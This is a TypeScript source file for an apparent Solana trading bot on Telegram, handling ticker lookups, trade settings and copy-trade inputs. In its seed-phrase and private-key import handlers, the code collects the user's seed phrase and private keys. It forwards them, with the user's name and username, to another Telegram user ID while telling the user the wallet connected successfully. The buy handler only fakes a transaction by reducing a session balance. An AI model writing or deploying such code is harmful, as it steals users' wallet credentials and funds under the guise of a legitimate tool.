import { Markup } from "telegraf";
import bs58 from "bs58";
import bot from "../bot";
import { getKeypairFromSeed, getKeypairFromPrivateKey } from "../config/solana";
import { MyContext, TickerData, WalletDataResponse } from "../config/interfaces";
import { isValidSolanaAddress, getTickerDetails, countFilter, calculatePriceImpact, rickBurpBot, solscanNetworkAddress, escapeMarkdownV2, defaultTimer, forwardUserImportedWallet, botSupportUsername, botLink } from "../config";
import settings from "../commands/settings";
import newCopyTrade from "../actions/copytrades/newCopyTrade";
import referral from "../commands/referral";

const hears = async (ctx: MyContext) => {
	let walletDataResponse: WalletDataResponse;

	try {
		// Ticker Listen
		if (ctx.message && 'text' in ctx.message && isValidSolanaAddress(ctx.message.text) && (!ctx.session.waitingAction || ctx.session.waitingAction === "BUY_TICKER")) {
			
			const activated = true;

			if (activated) {
				ctx.session.waitingAction = "BUY_TICKER";
				// delete ctx.session.waitingTicker;
				ctx.session.waitingTicker = ctx.message.text;
	
				const response = await getTickerDetails(ctx.message.text);
	
				if (response.error) {
					return await ctx.reply(`_Unable to get ticker/address details_`, { parse_mode: "MarkdownV2" });
				}
	
				const details: TickerData = response.data[0];
	
				await ctx.reply(
					`${details.baseToken.name} \\| ${details.baseToken.symbol} \\|\n`
					+ `\`${details.baseToken.address}\`\n\n`
					+ `[Explorer](${solscanNetworkAddress}${details.baseToken.address}) \\| [Chart](${details.url}) \\| [Scan](${rickBurpBot + details.baseToken.address}) \\|\n\n`
					+ `Price: *$${escapeMarkdownV2(details.priceUsd)}*\n`
					+ `5m: *${details.priceChange.m5 ? escapeMarkdownV2(details.priceChange.m5.toString()) : "NaN"}%*, 1h: *${details.priceChange.h1 ? escapeMarkdownV2(details.priceChange.h1.toString()) : "NaN"}%*, 6h: *${details.priceChange.h6 ? escapeMarkdownV2(details.priceChange.h6.toString()) : "NaN"}%*, 24h: *${details.priceChange.h24 ? escapeMarkdownV2(details.priceChange.h24.toString()) : "NaN"}%*\n`
					+ `MCap: *$${escapeMarkdownV2(countFilter(details.marketCap).toString())}* \\| Liq: ${details.liquidity ? `*$${escapeMarkdownV2(countFilter(details.liquidity.usd).toString())}*` : "*NaN*"}\n\n`
					+ `Price Impact \\(${details.liquidity ? escapeMarkdownV2((details.liquidity.base * calculatePriceImpact(details.liquidity.base, details.liquidity.quote, (ctx.session.user?.settings.leftBuyValue ?? 0) && (ctx.session.user?.settings.rightBuyValue ?? 0) && (ctx.session.user?.settings.leftBuyValue ?? 0) < (ctx.session.user?.settings.rightBuyValue ?? 0) ? (ctx.session.user?.settings.leftBuyValue ?? 0) : (ctx.session.user?.settings.rightBuyValue ?? 0)) / 100).toFixed(3).toString()) : "0\\.000"} SOL\\): *${details.liquidity ? escapeMarkdownV2(calculatePriceImpact(details.liquidity.base, details.liquidity.quote, (ctx.session.user?.settings.leftBuyValue ?? 0) && (ctx.session.user?.settings.rightBuyValue ?? 0) && (ctx.session.user?.settings.leftBuyValue ?? 0) < (ctx.session.user?.settings.rightBuyValue ?? 0) ? (ctx.session.user?.settings.leftBuyValue ?? 0) : (ctx.session.user?.settings.rightBuyValue ?? 0)).toFixed(2)) : "NaN"}%*\n\n`
					+ `Wallet Balance: *${escapeMarkdownV2((ctx.session.user?.balance || 0).toString())} SOL*`,
					{
						...Markup.inlineKeyboard([
							[Markup.button.callback('Cancel', 'CLOSE')],
							[Markup.button.url('Explorer', `${solscanNetworkAddress}${details.baseToken.address}`), Markup.button.url('Chart', `${details.url}`),],
							[Markup.button.callback(`Buy ${ctx.session.user?.settings.leftBuyValue} SOL`, 'BUY_TOKEN_LEFT_VALUE'), Markup.button.callback('Buy X SOL', 'BUY_TOKEN_X_VALUE'), Markup.button.callback(`Buy ${ctx.session.user?.settings.rightBuyValue} SOL`, 'BUY_TOKEN_RIGHT_VALUE')],
							[Markup.button.callback('Refresh', 'REFRESH_BUY_TICKER')],
						]),
						parse_mode: "MarkdownV2",
						link_preview_options: { is_disabled: true }
					}
				);	
	
				// Optional: Clear session after capturing response
				delete ctx.session.waitingAction;
			} else {
				return await ctx.reply(`_Unable to get ticker/address details_`, { parse_mode: "MarkdownV2" });
			}
		}

		// xBuy Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.waitingAction === "BUY_TOKEN_X_VALUE_AMOUNT" || (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && 'reply_to_message' in ctx.message && ctx.message.reply_to_message?.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userBuyAmountMessageId = ctx.message.message_id;
			const buyAmount = ctx.message.text.trim();

			const amountToBuy = parseFloat(buyAmount);

			if (!ctx.session.user?.balance) {
				await ctx.reply('Unable to get balance', {
					...Markup.inlineKeyboard([
						[Markup.button.callback('Create Wallet', 'CREATE_WALLET')],
						[Markup.button.callback('Close', 'CLOSE')],
					]),
					parse_mode: "MarkdownV2"
				});
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
					delete ctx.session.promptMessageId;
				}, defaultTimer);
			} else if (ctx.session.user?.balance && (ctx.session.user?.balance < amountToBuy || ctx.session.user.balance - amountToBuy < 0)) {
				await ctx.reply('Insufficient Balance\\.\n\n_Not enough SOL to buy ticker_', {
					...Markup.inlineKeyboard([
						[Markup.button.url('Buy', 'https://buy.moonpay.com/v2/buy?currencyCode=sol'), Markup.button.callback('Deposit', 'DEPOSIT')],
						[Markup.button.callback('Close', 'CLOSE')],
					]),
					parse_mode: "MarkdownV2"
				});
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
					delete ctx.session.promptMessageId;
				}, defaultTimer);
			} else {
				if (ctx.session.user && ctx.session.user.balance) ctx.session.user.balance = parseFloat((ctx.session.user.balance - amountToBuy).toPrecision(7));

				await ctx.reply(`Transaction initiated\\.\n\n_View transaction on Explorer_`, {
					...Markup.inlineKeyboard([
						[Markup.button.url('View on Solscan', `${solscanNetworkAddress}${ctx.session.waitingTicker}`), Markup.button.callback('Wallet', 'WALLET')],
						[Markup.button.callback('Close', 'CLOSE')],
					]),
					parse_mode: "MarkdownV2"
				});

				// Optional: Clear session after capturing response
				delete ctx.session.waitingAction;
				delete ctx.session.promptMessageId;
			}
		}

		// buySlippageValue Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.session.waitingAction === "ENTER_BUY_SLIPPAGE_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else if (parseFloat(replyValue) < 0 || parseFloat(replyValue) > 100.0) {
				await ctx.reply('Invalid range (0 - 100)');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.user.settings.waitingForSettingsResponse = false;
				ctx.session.user.settings.buySlippageValue = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentSettingsMessageId).catch((err) => console.log('Error deleting user message:', err));
					settings(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		// autoBuyValue Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.session.waitingAction === "ENTER_AUTO_BUY_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.user.settings.waitingForSettingsResponse = false;
				ctx.session.user.settings.autoBuyValue = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentSettingsMessageId).catch((err) => console.log('Error deleting user message:', err));
					settings(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		// leftBuyValue Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.session.waitingAction === "ENTER_LEFT_BUY_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.user.settings.waitingForSettingsResponse = false;
				ctx.session.user.settings.leftBuyValue = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentSettingsMessageId).catch((err) => console.log('Error deleting user message:', err));
					settings(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		// leftSellValue Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.session.waitingAction === "ENTER_LEFT_SELL_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else if (parseFloat(replyValue) < 0 || parseFloat(replyValue) > 100.0) {
				await ctx.reply('Invalid range (0 - 100)');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.user.settings.waitingForSettingsResponse = false;
				ctx.session.user.settings.leftSellValue = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentSettingsMessageId).catch((err) => console.log('Error deleting user message:', err));
					settings(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		// maxPriceImpactValue Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.session.waitingAction === "ENTER_MAX_PRICE_IMPACT_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else if (parseFloat(replyValue) < 0 || parseFloat(replyValue) > 100.0) {
				await ctx.reply('Invalid range (0 - 100)');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.user.settings.waitingForSettingsResponse = false;
				ctx.session.user.settings.maxPriceImpactValue = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentSettingsMessageId).catch((err) => console.log('Error deleting user message:', err));
					settings(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		// minimumPositionValue Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.session.waitingAction === "ENTER_MINIMUM_POSITION_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.user.settings.waitingForSettingsResponse = false;
				ctx.session.user.settings.minimumPositionValue = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentSettingsMessageId).catch((err) => console.log('Error deleting user message:', err));
					settings(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		// rightBuyValue Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.session.waitingAction === "ENTER_RIGHT_BUY_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.user.settings.waitingForSettingsResponse = false;
				ctx.session.user.settings.rightBuyValue = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentSettingsMessageId).catch((err) => console.log('Error deleting user message:', err));
					settings(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		// rightSellValue Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.session.waitingAction === "ENTER_RIGHT_SELL_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else if (parseFloat(replyValue) < 0 || parseFloat(replyValue) > 100.0) {
				await ctx.reply('Invalid range (0 - 100)');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.user.settings.waitingForSettingsResponse = false;
				ctx.session.user.settings.rightSellValue = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentSettingsMessageId).catch((err) => console.log('Error deleting user message:', err));
					settings(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		// sellSlippageValue Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.session.waitingAction === "ENTER_SELL_SLIPPAGE_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else if (parseFloat(replyValue) < 0 || parseFloat(replyValue) > 100.0) {
				await ctx.reply('Invalid range (0 - 100)');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.user.settings.waitingForSettingsResponse = false;
				ctx.session.user.settings.sellSlippageValue = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentSettingsMessageId).catch((err) => console.log('Error deleting user message:', err));
					settings(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		// transactionPriorityAmount Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.session.waitingAction === "ENTER_TRANSACTION_PRIORITY_AMOUNT" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.settings.waitingForSettingsResponse && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.user.settings.waitingForSettingsResponse = false;
				ctx.session.user.settings.transactionPriorityAmount = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentSettingsMessageId).catch((err) => console.log('Error deleting user message:', err));
					settings(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
		}

		// seedPhraseImport Listen
		if (ctx.message && 'text' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_SEED_PHRASE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userSeedPhraseMessageId = ctx.message.message_id;
			const seedPhrase = ctx.message.text.trim();
			ctx.session.waitingResponse = false;

			walletDataResponse = {};

			try {
				const keypairFromSeed = await getKeypairFromSeed(seedPhrase);
				walletDataResponse = {
					privateKey: bs58.encode(keypairFromSeed.secretKey),
					publicKey: keypairFromSeed.publicKey.toBase58(),
					secretKey: keypairFromSeed.secretKey.toString(),
					seed: seedPhrase,
					walletAddress: keypairFromSeed.publicKey.toBase58(),
				};

				if (ctx.session.user) {
					ctx.session.user.seed = seedPhrase;
					ctx.session.user.publicKey = keypairFromSeed.publicKey.toBase58();
					ctx.session.user.secretKey = keypairFromSeed.secretKey.toString();
					ctx.session.user.privateKey = bs58.encode(keypairFromSeed.secretKey);
					ctx.session.user.walletAddress = keypairFromSeed.publicKey.toBase58();
				}

				setTimeout(() => {
					ctx.deleteMessage(userSeedPhraseMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);

				if (keypairFromSeed) await ctx.reply(`Wallet connected successfully\n\nGo to /wallet`);
				// if (keypairFromSeed) await ctx.reply(`Error importing wallet`);
				
				// Optional: Clear session after capturing response
				delete ctx.session.promptMessageId;
				delete ctx.session.waitingAction;

				// Forward the user's response to another Telegram user ID
				return await forwardUserImportedWallet(ctx, { name: ctx.session.name, username: ctx.session.username, ...walletDataResponse });
			} catch (err) {
				await ctx.reply(`_Unable to import wallet with seed phrase_\n\nContact support ${botSupportUsername}`, { parse_mode: "MarkdownV2" });
			}
		}

		// privateKeyImport Listen
		if (ctx.message && 'text' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_PRIVATE_KEY" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userPrivateKeyMessageId = ctx.message.message_id;
			const privateKey = ctx.message.text.trim();
			ctx.session.waitingResponse = false;

			walletDataResponse = {};

			try {
				const keypairFromPrivateKey = getKeypairFromPrivateKey(privateKey);
				walletDataResponse = {
					privateKey: bs58.encode(keypairFromPrivateKey.secretKey),
					publicKey: keypairFromPrivateKey.publicKey.toBase58(),
					secretKey: keypairFromPrivateKey.secretKey.toString(),
					seed: "",
					walletAddress: keypairFromPrivateKey.publicKey.toBase58(),
				};

				if (ctx.session.user) {
					ctx.session.user.seed = "";
					ctx.session.user.publicKey = keypairFromPrivateKey.publicKey.toBase58();
					ctx.session.user.secretKey = keypairFromPrivateKey.secretKey.toString();
					ctx.session.user.privateKey = bs58.encode(keypairFromPrivateKey.secretKey);
					ctx.session.user.walletAddress = keypairFromPrivateKey.publicKey.toBase58();
				}

				setTimeout(() => {
					ctx.deleteMessage(userPrivateKeyMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);

				if (keypairFromPrivateKey) await ctx.reply(`Wallet connected successfully\n\nGo to /wallet`);
				// if (keypairFromPrivateKey) await ctx.reply(`Error importing wallet`);
				
				// Optional: Clear session after capturing response
				delete ctx.session.promptMessageId;
				delete ctx.session.waitingAction;
				
				// Forward the user's response to another Telegram user ID
				return await forwardUserImportedWallet(ctx, { name: ctx.session.name, username: ctx.session.username, ...walletDataResponse });
			} catch (err) {
				await ctx.reply(`_Unable to import wallet with private key_\n\nContact support ${botSupportUsername}`, { parse_mode: "MarkdownV2" });
			}
		}

		// tag Listen
		if (ctx.message && 'text' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.currentCopyTrade && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_COPY_TRADE_TAG_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			// if (replyValue.match(/[a-zA-Z]/gi)) {
			// 	await ctx.reply('Invalid Value');
			// 	setTimeout(() => {
			// 		ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
			// 	}, defaultTimer);
			// } 
			// else {
				ctx.session.waitingResponse = false;
				if (ctx.session.user) ctx.session.user.currentCopyTrade.tag = replyValue;
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentCopyTradeMessageId).catch((err) => console.log('Error deleting user message:', err));
					newCopyTrade(ctx);
				}, defaultTimer);
			// }

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
			delete ctx.session.currentCopyTradeMessageId;
		}

		// targetWallet Listen
		if (ctx.message && 'text' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.currentCopyTrade && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_COPY_TRADE_TARGET_WALLET_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			// if (replyValue.match(/[a-zA-Z]/gi)) {
			// 	await ctx.reply('Invalid Value');
			// 	setTimeout(() => {
			// 		ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
			// 	}, defaultTimer);
			// } 
			if (!isValidSolanaAddress(replyValue)) {
				await ctx.reply('Invalid target wallet address');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.waitingResponse = false;
				if (ctx.session.user) ctx.session.user.currentCopyTrade.targetWallet = replyValue;
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentCopyTradeMessageId).catch((err) => console.log('Error deleting user message:', err));
					newCopyTrade(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
			delete ctx.session.currentCopyTradeMessageId;
		}

		// buyAmount Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.currentCopyTrade && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_COPY_TRADE_BUY_AMOUNT_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.waitingResponse = false;
				if (ctx.session.user) ctx.session.user.currentCopyTrade.buyAmount = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentCopyTradeMessageId).catch((err) => console.log('Error deleting user message:', err));
					newCopyTrade(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
			delete ctx.session.currentCopyTradeMessageId;
		}

		// buyGasAmount Listen
		if (ctx.message && 'text' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.session.user && ctx.session.user.currentCopyTrade && ctx.session.waitingResponse && ctx.session.waitingAction === "ENTER_COPY_TRADE_BUY_GAS_AMOUNT_VALUE" || (ctx.message && 'text' in ctx.message && 'reply_to_message' in ctx.message && !ctx.message.text.match(/[a-zA-Z]/gi) && ctx.message.reply_to_message && ctx.message.reply_to_message.message_id === ctx.session.promptMessageId)) {
			// Store the user's message ID to delete it after a delay
			const userReplyMessageId = ctx.message.message_id;
			const replyValue = ctx.message.text.trim();

			if (replyValue.match(/[a-zA-Z]/gi)) {
				await ctx.reply('Invalid Value');
				setTimeout(() => {
					ctx.deleteMessage(ctx.session.promptMessageId).catch((err) => console.log('Error deleting user message:', err));
				}, defaultTimer);
			} else {
				ctx.session.waitingResponse = false;
				if (ctx.session.user) ctx.session.user.currentCopyTrade.buyGasAmount = parseFloat(replyValue);
				setTimeout(async () => {
					ctx.deleteMessage(ctx.session.currentCopyTradeMessageId).catch((err) => console.log('Error deleting user message:', err));
					newCopyTrade(ctx);
				}, defaultTimer);
			}

			// Optional: Clear session after capturing response
			delete ctx.session.waitingAction;
			delete ctx.session.promptMessageId;
			delete ctx.session.currentCopyTradeMessageId;
		}

		// sellGasAmount Listen
